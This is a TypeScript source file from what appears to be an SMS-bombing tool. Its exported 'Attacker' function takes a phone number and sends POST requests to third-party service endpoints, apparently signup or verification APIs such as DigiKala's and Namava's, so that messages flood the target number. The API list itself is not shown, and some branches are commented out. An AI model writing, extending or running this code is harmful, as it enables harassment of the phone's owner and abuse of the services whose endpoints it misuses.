import color from "chalk";
import axios from "axios";
import { API as APIs } from "./api";
import { Logger } from "./logger";

export const Attacker = async (num: number, Loop: string) => {
  return new Promise((resolve, reject) => {
    // const API = APIs(num)[Math.floor(Math.random() * APIs(num).length)];
    const API = APIs(num)[5];
    var headers = {};
    if (API.headers) headers = API.headers;

    if (API.method == "POST") {
      axios
        .post(API.url, API.data, headers)
        .then(
          (res: {
            status: number;
            data: {
              status: number;
              message: string;
              succeeded: boolean;
              error: { message: string };
            };
          }) => {
            if (API.name === "DigiKala" && res.data.status === 400)
              reject(`Request From ${API.name} Failed \n${res.data.message}`);
            else if (API.name === "Namava" && !res.data.succeeded)
              reject(
                `Request From ${API.name} Failed \n${res.data.error.message}`
              );
            //  else if (res.status === 200) {
            //   resolve(`Request From ${API.name} Sends To ${num}`);
            // }
          }
        )
        .catch((error) => {
          // resolve(`${API.name} : \n${error.response.statusText}`);
          console.log(
            color.white.bgRedBright(
              `${API.name} : \n${error.response.statusText}`
            )
          );
        });

      // } else {
      //   axios
      //     .get(API.url.headers)
      //     .then(function () {
      //       console.log(
      //         color.green(`Request From ${API.name} Sends To ${number} | ${q++}`)
      //       );
      //     })
      //     .catch((error) => {
      //       console.log(color.red(`ERROR :\n${error}`));
      //     });
    }
  });
};
